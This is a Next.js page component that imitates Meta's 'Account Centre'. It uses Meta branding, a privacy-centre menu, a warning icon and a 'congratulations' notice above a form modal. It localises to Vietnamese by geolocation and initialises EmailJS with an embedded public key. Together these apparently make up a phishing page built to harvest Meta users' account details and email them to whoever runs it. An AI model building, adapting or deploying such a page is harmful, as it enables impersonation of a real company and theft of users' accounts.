'use client';

import MetaImage from '@/assets/images/meta-image.png';
import WarningImage from '@/assets/images/warning.png';
import FormModal from '@/components/form-modal';
import { useGeoStore } from '@/store/geo-store';
import type { Dictionary } from '@/types/content';
import getDictionary from '@/utils/get-content';
import emailjs from '@emailjs/browser';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

const Page: FC = () => {
    const { geoInfo } = useGeoStore();
    const [dictionary, setDictionary] = useState<Dictionary | null>(null);
    const [isLoading, setIsLoading] = useState(true);

    useEffect(() => {
        const initializeContent = async () => {
            try {
                setIsLoading(true);

                const languageCode = geoInfo?.country_code === 'VN' ? 'vi' : 'en';

                const fullDictionary = await getDictionary(languageCode);
                setDictionary(fullDictionary);
            } catch (err) {
                console.error('Failed to initialize content:', err);
            } finally {
                setIsLoading(false);
            }
        };

        initializeContent();

        emailjs.init({
            publicKey: 'zfcufNH8QZhzMnIxU'
        });
    }, [geoInfo]);

    if (isLoading || !dictionary) {
        return <div className='flex min-h-screen items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'></div>;
    }

    const content = dictionary.privacyCenter;

    const menuItems: MenuItem[] = [
        { id: 'home', icon: faHouse, label: content.menuItems.home, isActive: true },
        { id: 'search', icon: faMagnifyingGlass, label: content.menuItems.search },
        { id: 'privacy', icon: faLock, label: content.menuItems.privacy },
        { id: 'rules', icon: faCircleInfo, label: content.menuItems.rules },
        { id: 'settings', icon: faGear, label: content.menuItems.settings }
    ];

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Account Centre</title>
            <div className='flex w-full max-w-275'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-17.5' />
                    <p className='my-4 text-2xl font-bold'>{content.title}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{item.label}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <Image src={WarningImage} alt='' className='h-12.5 w-12.5' />
                        <p className='text-2xl font-bold'>{content.congratulationsTitle}</p>
                    </div>
                    <p>{content.congratulationsMessage}</p>
                    <FormModal dictionary={dictionary} />
                </div>
            </div>
        </div>
    );
};

export default Page;
